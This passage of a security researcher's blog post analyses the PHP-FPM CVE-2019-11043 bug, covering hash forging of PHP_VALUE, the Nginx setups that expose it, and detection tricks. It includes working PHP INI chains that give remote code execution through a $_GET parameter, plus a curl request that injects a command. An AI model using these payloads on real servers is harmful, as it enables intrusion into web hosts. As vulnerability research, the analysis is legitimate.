+<p>PHP-FPM first retrieves the environment structure from the hash table, and then check the <code>hash_value</code>, <code>var_len</code> and content. We can forge the content, but how to forge the <code>hash_value</code> and <code>var_len</code>? OK, let’s do it!  </p>
+<p>The <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.h#L31">hash algorithm</a> in PHP-FPM is simple.  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FCGI_HASH_FUNC(var, var_len) \</span></span><br><span class="line"><span class="meta">    (UNEXPECTED(var_len &lt; 3) ? (unsigned int)var_len : \</span></span><br><span class="line"><span class="meta">        (((unsigned int)var[3]) &lt;&lt; 2) + \</span></span><br><span class="line"><span class="meta">        (((unsigned int)var[var_len-2]) &lt;&lt; 4) + \</span></span><br><span class="line"><span class="meta">        (((unsigned int)var[var_len-1]) &lt;&lt; 2) + \</span></span><br><span class="line"><span class="meta">        var_len)</span></span><br></pre></td></tr></table></figure>
+
+<p>For the <code>PHP_VALUE</code>, its hash value is <code>(&#39;_&#39;&lt;&lt;2) + (&#39;U&#39;&lt;&lt;4) + (&#39;E&#39;&lt;&lt;) + 9 = 2015</code>. The author sends a HTTP header <code>HTTP_EBUT</code>, and its hash value is <code>(&#39;P&#39;&lt;&lt;2) + (&#39;U&#39;&lt;&lt;4) + (&#39;T&#39;&lt;&lt;2) + 9 = 2015</code>. The fake header has been stored in the hash table. Once we trigger the vulnerability and overwrite the <code>HTTP_EBUT</code> to <code>PHP_VALUE</code>, the forged one becomes valid! Both variables have the same <code>hash_value</code> and <code>var_len</code>, and now, they have the same key content!  </p>
+<p>We can create arbitrary <code>PHP_VALUE</code> now. To get code execution seems easy! The author create a series of PHP INI chains to get code execution.  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> chain = []<span class="keyword">string</span>&#123;</span><br><span class="line">    <span class="string">&quot;short_open_tag=1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;html_errors=0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;include_path=/tmp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;auto_prepend_file=a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;log_errors=1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;error_reporting=2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;error_log=/tmp/a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;extension_dir=\&quot;&lt;?=`\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;extension=\&quot;<span class="subst">$_GET</span>[a]`?&gt;\&quot;&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Write-a-working-exploit"><a href="#Write-a-working-exploit" class="headerlink" title="Write a working exploit"></a>Write a working exploit</h1><p>OK, here we have all the details. However, it’s still hard to write the exploit. Although our steps are straightforward, there are still several obstacles making the exploit unstable and unexploitable… :(  </p>
+<h2 id="A-The-Nginx-obstacle"><a href="#A-The-Nginx-obstacle" class="headerlink" title="A. The Nginx obstacle"></a>A. The Nginx obstacle</h2><p>The first obstacle is the Nginx configuration. As the PHP is an independent package from Nginx. To make the Nginx handle PHP scripts, there are many settings required in the configuration. Here we classified the configurations into 4 aspect.  </p>
+<ol>
+<li><p>Is <code>PATH_INFO</code> supported? Because <code>PATH_INFO</code> is not a necessary feature. If there is no <code>fastcgi_param PATH_INFO $blah;</code> in Nginx configuration, you are safe!</p>
+</li>
+<li><p>The PHP dispatcher - In order to dispatch requests to PHP-FPM. Sysadmin must set a regular expression to match the URI. There are several ways to capture that, and the most common two situations are:  </p>
+<ol>
+<li>The setting from <a target="_blank" rel="noopener" href="https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/">Nginx official manual</a> <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>The default Nginx configuration snippet on current Linux dists <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+ Both two ways are very common in the world. Although the meaning looks like the same, the exploitation is absolutely different! We will introduce this in next section.</li>
+</ol>
+</li>
+<li><p>Is the file existed?</p>
+<p> The default Nginx configuration checks the file existence before sending it to PHP-FPM. You may see the following configuration:  </p>
+ <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line">    <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+?\.php)(/.*)$</span>;</span><br><span class="line">    <span class="attribute">if</span> (!-f <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> or  </p>
+ <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$fastcgi_script_name</span> =<span class="number">404</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> However, it’s still possible to be removed due to scalability or performance issues. For example, just imagine Nginx and PHP-FPM are not on the same server!</p>
+</li>
+<li><p>The <code>PATH_INFO</code> sequential problem</p>
+<p> From the <a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam/blob/master/requester.go#L65">neex’s exploit</a>, he adjust the buffer by increasing the length of <code>QUERY_STRING</code>. But what if the <code>PATH_INFO</code> comes before the <code>QUERY_STRING</code>? You can not control the <code>PATH_INFO</code> to the region you want. Actually, in my default installed Nginx on Ubuntu 18.04 and 16.04. The configuration looks like this:  </p>
+ <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ------------------------------------</span></span><br><span class="line"><span class="comment"># /etc/nginx/sites-enabled/nginx.conf </span></span><br><span class="line"></span><br><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">      <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line"></span><br><span class="line">      <span class="comment"># With php7.0-cgi alone:</span></span><br><span class="line">      <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">      <span class="comment"># With php7.0-fpm:</span></span><br><span class="line">      <span class="attribute">fastcgi_pass</span> unix:/run/php/php7.0-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------</span></span><br><span class="line"><span class="comment"># /etc/nginx/snippets/fastcgi-php.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># regex to split $uri to $fastcgi_script_name and $fastcgi_path</span></span><br><span class="line"><span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check that the PHP script exists before passing it</span></span><br><span class="line"><span class="attribute">try_files</span> <span class="variable">$fastcgi_script_name</span> =<span class="number">404</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass the fact that try_files resets $fastcgi_path_info</span></span><br><span class="line"><span class="comment"># see: http://trac.nginx.org/nginx/ticket/321</span></span><br><span class="line"><span class="attribute">set</span> <span class="variable">$path_info</span> <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"><span class="attribute">fastcgi_param</span> PATH_INFO <span class="variable">$path_info</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line"><span class="attribute">include</span> fastcgi.conf;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------</span></span><br><span class="line"><span class="comment"># /etc/nginx/fastcgi.conf</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME    <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line"><span class="attribute">fastcgi_param</span>  QUERY_STRING       <span class="variable">$query_string</span>;</span><br><span class="line"><span class="attribute">fastcgi_param</span>  REQUEST_METHOD     <span class="variable">$request_method</span>;</span><br><span class="line"><span class="attribute">fastcgi_param</span>  CONTENT_TYPE       <span class="variable">$content_type</span>;</span><br><span class="line"><span class="attribute">fastcgi_param</span>  CONTENT_LENGTH     <span class="variable">$content_length</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
+
+<p> As you can see, the <code>PATH_INFO</code> are defined before the <code>QUERY_STRING</code>, so the original exploit doesn’t cover that. That’s also the reason why I trace into this bug!</p>
+</li>
+</ol>
+<p>So, the Nginx configuration greatly affects this vulnerability. For the obstacle No.1 and No.3, it’s hopeless and unexploitable. About how to improve obstacle No.2 and No.4, we leave it for the last section!  </p>
+<p>However, a fun fact is that if you install the Nginx and PHP-FPM on Ubuntu(16.04&#x2F;18.04) thought the <code>apt</code> package manager. You can remove just one line(<code>try_files</code>) and make your service vulnerable :P  </p>
+<h2 id="B-Vulnerability-verification-problem"><a href="#B-Vulnerability-verification-problem" class="headerlink" title="B. Vulnerability verification problem"></a>B. Vulnerability verification problem</h2><p>Before exploiting the target, we need to check if the target is vulnerable or not. Because the remote Nginx configuration is unknown, we need to find a reliable way to trigger the environment overwrite. Here the author leverage the double buffer mechanism!  </p>
+<p>As I mentioned before:  </p>
+<blockquote>
+<p>If the buffer reaches the end(pos &gt; end). PHP-FPM creates a new buffer and put the previous one to the structure member fcgi_data_seg-&gt;next.</p>
+</blockquote>
+<p>The neex’s exploit enlarges the <code>QUERY_STRING</code> to force PHP-FPM allocate a new buffer and therefore place the <code>PATH_INFO</code> buffer at the right location. As long as the <code>PATH_INFO</code> is on the top of the new <code>fcgi_data_seg-&gt;data</code> buffer, we know the offset from the <code>PATH_INFO</code> to <code>fcgi_data_seg-&gt;pos</code> is 34.  </p>
+<p>We fixed our <code>PATH_INFO</code> length to 34 so that we can exactly place the null-byte in the right address. Due to the PHP-FPM implementation, the HTTP headers must be right after the <code>PATH_INFO</code>, and we can designed the context like:  </p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">10</span>s request.env.data.data</span><br><span class="line"><span class="number">0</span>x55c8cc0e74d8: <span class="string">&quot;PATH_INFO&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e74e2: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e74e3: <span class="string">&quot;HTTP_HOST&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e74ed: <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e74f7: <span class="string">&quot;HTTP_DUMMY_HEADERSSS&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e750c: &#x27;A&#x27; &lt;repeats <span class="number">11</span> times&gt;</span><br><span class="line"><span class="number">0</span>x55c8cc0e7518: <span class="string">&quot;HTTP_EBUT&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e7522: <span class="string">&quot;NOGG&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e7527: <span class="string">&quot;ORIG_PATH_INFO&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e7536: <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">6</span>s request.env.data.pos</span><br><span class="line"><span class="number">0</span>x55c8cc0e7500: <span class="string">&quot;Y_HEADERSSS&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e750c: &#x27;A&#x27; &lt;repeats <span class="number">11</span> times&gt;</span><br><span class="line"><span class="number">0</span>x55c8cc0e7518: <span class="string">&quot;HTTP_EBUT&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e7522: <span class="string">&quot;NOGG&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e7527: <span class="string">&quot;ORIG_PATH_INFO&quot;</span></span><br><span class="line"><span class="number">0</span>x55c8cc0e7536: <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>We then adjust the length of <code>HTTP_DUMMY_HEADER</code> to exactly overwrite the <code>HTTP_EBUT</code> and its value to <code>PHP_VALUE\nsession.auto_start=1;;;</code>.  </p>
+<p>This is the memory view before the environment variable is written on <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L1165">fpm_main.c#1165</a>.  </p>
+<p><img src="/posts/2019-10-an-analysis-and-thought-about-recently/ed531d0337d510c0-04.png">  </p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p *request.env.buckets</span><br><span class="line">...</span><br><span class="line">&#123;</span><br><span class="line">      hash_value = <span class="number">0</span>x7e9,</span><br><span class="line">      var_len = <span class="number">0</span>x9,</span><br><span class="line">      var = <span class="number">0</span>x55c8cc0e7518 <span class="string">&quot;HTTP_BBUT&quot;</span>,</span><br><span class="line">      val_len = <span class="number">0</span>x4,</span><br><span class="line">      val = <span class="number">0</span>x55c8cc0e7522 <span class="string">&quot;NOGG&quot;</span>,</span><br><span class="line">      next = <span class="number">0</span>x55c8cc0e4aa0,</span><br><span class="line">      list_next = <span class="number">0</span>x55c8cc0e4c80</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This is the memory view after the environment variable is written.  </p>
+<p><img src="/posts/2019-10-an-analysis-and-thought-about-recently/b350faa64f87945d-05.png">  </p>
+<p>While the <code>session.auto_start</code> is changed to <code>1</code>, we can just check the <code>set-cookie</code> header in HTTP response to know whether our exploit succeeds or not!  </p>
+<h2 id="C-The-length-limitation"><a href="#C-The-length-limitation" class="headerlink" title="C. The length limitation"></a>C. The length limitation</h2><p>As we mentioned before, we fixed our <code>PATH_INFO</code> length to 34 so that we can exactly place the null-byte in the right address. The previous detect payload is good and short enough, and this is also the simplest detect method. It’s also the first situation in our <code>the PHP dispatcher</code> section.  </p>
+<p>However, in another scenario, the URI must end with <code>.php</code> so that our payload must be less than 34 bytes. Otherwise, if we plus the the <code>.php</code> suffix, the original detect payload will become 35 bytes…  </p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_VALUE\nsession.auto_start=<span class="number">1</span>;.php</span><br></pre></td></tr></table></figure>
+
+<p>Due to the length limitation, most of the INI stuff are too long, and building a code execution chain becomes harder… :(  </p>
+<h1 id="Improve-the-exploit"><a href="#Improve-the-exploit" class="headerlink" title="Improve the exploit"></a>Improve the exploit</h1><p>After I had deeper understanding of this, I kept thinking if there is any way to improve the exploit.  </p>
+<h2 id="A-The-PATH-INFO-sequential-problem"><a href="#A-The-PATH-INFO-sequential-problem" class="headerlink" title="A. The PATH_INFO sequential problem"></a>A. The <code>PATH_INFO</code> sequential problem</h2><p>It’s easy. Because the <code>PATH_INFO</code> is ahead of <code>QUERY_STRING</code>, and there are no <code>SCRIPT_FILENAME</code>, <code>SCRIPT_NAME</code> and <code>REQUEST_URI</code> to interfere our alignment. We can just pad on the <code>PATH_INFO</code> itself to enlarge the buffer!  </p>
+<h2 id="B-How-to-detect-the-vulnerability"><a href="#B-How-to-detect-the-vulnerability" class="headerlink" title="B. How to detect the vulnerability"></a>B. How to detect the vulnerability</h2><p>You can just put a single newline in the <code>PATH_INFO</code> and increase the PATH_INFO and QUERY_STRING length(depend on situations). If the PHP-FPM crashes, that means you got it :P </p>
+<p>If there is a PHPINFO page. To detect the vulnerability is more easy, you can just fetch the &#x2F;info.php&#x2F;%0a.php and observe the $_SERVER[‘PATH_INFO’] is corrupted or not!</p>
+<h2 id="C-Bypass-the-length-limitation"><a href="#C-Bypass-the-length-limitation" class="headerlink" title="C. Bypass the length limitation"></a>C. Bypass the length limitation</h2><p>It’s not easy to bypass that. Due to the <code>.php</code> suffix, we have only two options. The first choice is building the payloads under constraint, and the other one is to bypass the constraint!  </p>
+<p>The first one is to build the payload under constraint. The <a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam/pull/2/files">neex’s exploit</a> leverage <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L457">another CGI environment <code>REQUEST_BODY_FILE</code></a> to control more bytes on error messages. This is genius!  </p>
+<p>My method is to leverage the <code>output_method</code> directive. Here is the RCE chain I built:  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">inis = [</span><br><span class="line">    <span class="string">&quot;error_reporting=2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;short_open_tag=1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;html_errors=0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;log_errors=1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;output_handler=&lt;?/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;output_handler=*/`&quot;</span>,</span><br><span class="line">    <span class="string">&quot;output_handler=&#x27;&#x27;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;extension_dir=&#x27;`?&gt;&#x27;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;extension=$_GET[a]&quot;</span>,</span><br><span class="line">    <span class="string">&quot;error_log  = /tmp/l&quot;</span>,</span><br><span class="line">    <span class="string">&quot;include_path=/tmp&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>And the <code>/tmp/l.php</code> looks like:  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">27</span>-Oct-<span class="number">2019</span> <span class="number">13</span>:<span class="number">55</span>:<span class="number">05</span> UTC] PHP Warning:  Unknown: failed to open stream: No such file <span class="keyword">or</span> directory in Unknown on line <span class="number">0</span></span><br><span class="line">[<span class="number">27</span>-Oct-<span class="number">2019</span> <span class="number">13</span>:<span class="number">55</span>:<span class="number">05</span> UTC] PHP Warning:  Unknown: <span class="function"><span class="keyword">function</span> &#x27;&lt;?/*.<span class="title">php</span>&#x27; <span class="title">not</span> <span class="title">found</span> <span class="title">or</span> <span class="title">invalid</span> <span class="title">function</span> <span class="title">name</span> <span class="title">in</span> <span class="title">Unknown</span> <span class="title">on</span> <span class="title">line</span> 0</span></span><br><span class="line"><span class="function">[27-<span class="title">Oct</span>-2019 13:55:05 <span class="title">UTC</span>] <span class="title">PHP</span> <span class="title">Warning</span>:  <span class="title">Unknown</span>: <span class="title">function</span> &#x27;*/`&#x27; <span class="title">not</span> <span class="title">found</span> <span class="title">or</span> <span class="title">invalid</span> <span class="title">function</span> <span class="title">name</span> <span class="title">in</span> <span class="title">Unknown</span> <span class="title">on</span> <span class="title">line</span> 0</span></span><br><span class="line"><span class="function">[27-<span class="title">Oct</span>-2019 13:55:05 <span class="title">UTC</span>] <span class="title">PHP</span> <span class="title">Warning</span>:  <span class="title">Unknown</span>: <span class="title">Unable</span> <span class="title">to</span> <span class="title">load</span> <span class="title">dynamic</span> <span class="title">library</span> &#x27;$<span class="title">_GET</span>[<span class="title">a</span>]&#x27; (<span class="params">tried: `?&gt;.php/<span class="variable">$_GET</span>[a] (<span class="params">`?&gt;.php/<span class="variable">$_GET</span>[a]: cannot open shared <span class="keyword">object</span> file: No such file <span class="keyword">or</span> directory</span>), `?&gt;.php/<span class="variable">$_GET</span>[a].so (<span class="params">`?&gt;.php/<span class="variable">$_GET</span>[a].so: cannot open shared <span class="keyword">object</span> file: No such file <span class="keyword">or</span> directory</span>)</span>) <span class="title">in</span> <span class="title">Unknown</span> <span class="title">on</span> <span class="title">line</span> 0</span></span><br></pre></td></tr></table></figure>
+
+<p>We put a lot of garbage into the backtick, of course, including our <code>$_GET[a]</code>, so we can simply use the newline to execute arbitrary command.  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://localhost/index.php?a=%0asleep+5%0a&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>About the constraint bypass, my idea is to pop the previous environment onto the newly <code>fcgi_data_seg-&gt;data</code> buffer. In most Nginx configurations, the environment variable before <code>PATH_INFO</code> is usually <code>REDIRECT_STATUS=200</code>. So we can pop the string <code>200</code> onto the buffer and extend the controllable space size from <code>34</code> to <code>37</code> bytes! That’s enough to fit all payloads including the <code>.php</code> suffix! This idea works on my local environment, and I am now trying to make exploit more reliable :D  </p>
+<p>OK, this is whole the detail about the recently PHP-FPM 2019-11043. If you have any further idea for making the exploit more reliable and exploitable, please let me know and contribute back to <a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam">the original author’s GitHub repo</a>!  </p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
